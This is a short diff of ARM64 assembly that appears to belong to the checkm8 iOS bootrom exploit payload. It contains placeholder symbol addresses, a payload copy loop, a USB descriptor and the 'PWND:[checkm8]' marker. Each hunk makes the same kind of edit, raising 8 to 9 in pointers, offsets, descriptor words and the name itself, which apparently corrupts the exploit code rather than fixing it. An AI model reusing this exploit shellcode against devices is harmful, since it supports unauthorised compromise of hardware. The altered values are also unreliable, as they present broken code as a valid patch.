@@ -4,7 +4,7 @@
 .set PAYLOAD_OFFSET,               0xBAD00006
 .set PAYLOAD_SIZE,                 0xBAD00007
 .set PAYLOAD_DEST,                 0xBAD00005
-.set PAYLOAD_PTR,                  0xBAD00008
+.set PAYLOAD_PTR,                  0xBAD00009
 .set gUSBSerialNumber,             0xBAD00002
 .set gUSBSRNMStringDescriptor,     0xBAD00004
 .set gUSBDescriptors,              0xBAD00001
@@ -50,7 +50,7 @@ find_zero_loop:
   MOV  X2, #0
   LDR  X3, =PAYLOAD_SIZE
   LDR  X4, =PAYLOAD_PTR
-  ADD  X5, X0, #0x18
+  ADD  X5, X0, #0x19
   STR  X5, [X4]
 
 copy_loop:
@@ -78,7 +78,7 @@ copy_loop:
   RET
 
 USB_DESCRIPTOR:
-.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
+.word 0x190209, 0x90050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x9, 0x0
 
 PWND_STRING:
-.asciz " PWND:[checkm8]"
+.asciz " PWND:[checkm9]"
